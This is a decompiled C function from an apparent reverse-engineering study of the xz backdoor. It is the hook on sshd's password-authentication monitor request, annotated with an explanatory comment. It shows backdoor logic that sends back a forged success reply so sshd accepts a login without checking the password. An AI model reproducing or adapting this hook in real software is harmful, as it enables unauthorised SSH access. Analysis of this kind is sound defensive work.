// /home/kali/xzre-ghidra/xzregh/108100_mm_answer_authpassword_hook.c
// Function: mm_answer_authpassword_hook @ 0x108100
// Calling convention: unknown
// Prototype: undefined mm_answer_authpassword_hook(void)


/*
 * AutoDoc: Responds to MONITOR_REQ_AUTHPASSWORD by either replaying the canned buffer stored in the
 * global payload context or synthesising a minimal success packet on the fly. The hook emits the
 * reply through fd_write(), mirrors sshd's bookkeeping by updating the monitor context at
 * lVar1+0xa0, and returns 1 so the monitor thread believes password authentication succeeded
 * without ever consulting sshd.
 */
#include "xzre_types.h"


undefined8 mm_answer_authpassword_hook(long param_1,int param_2,long param_3)

{
  long lVar1;
  code *pcVar2;
  undefined8 uVar3;
  uint uVar4;
  uint *puVar5;
  uint *auth_reply;
  uint libc_imports;
  uint uStack_11;
  undefined1 uStack_d;
  undefined4 uStack_c;
  
  libc_imports = 0;
  lVar1 = *(long *)(global_ctx + 0x20);
  uStack_11 = 0;
  uStack_d = 0;
  uStack_c = 0;
  if ((param_3 == 0 || param_2 < 0) || (param_1 == 0)) {
    if ((*(long *)(global_ctx + 0x10) != 0) &&
       (pcVar2 = *(code **)(*(long *)(global_ctx + 0x10) + 0x18), pcVar2 != (code *)0x0)) {
      (*pcVar2)(0);
    }
    uVar3 = 0;
  }
  else {
    uVar4 = (uint)*(ushort *)(lVar1 + 0x90);
    if ((*(ushort *)(lVar1 + 0x90) == 0) ||
       (puVar5 = *(uint **)(lVar1 + 0x98), puVar5 == (uint *)0x0)) {
      puVar5 = &libc_imports;
      uStack_d = 1;
      uStack_11 = *(uint *)(lVar1 + 0x40) & 0xff;
      libc_imports = (-(uint)(*(int *)(lVar1 + 0xb8) == 0) & 0xfc000000) + 0x9000000;
      uVar4 = (libc_imports >> 0x18) + 4;
    }
    fd_write(param_2,puVar5,uVar4);
    **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd0);
    uVar3 = 1;
  }
  return uVar3;
}

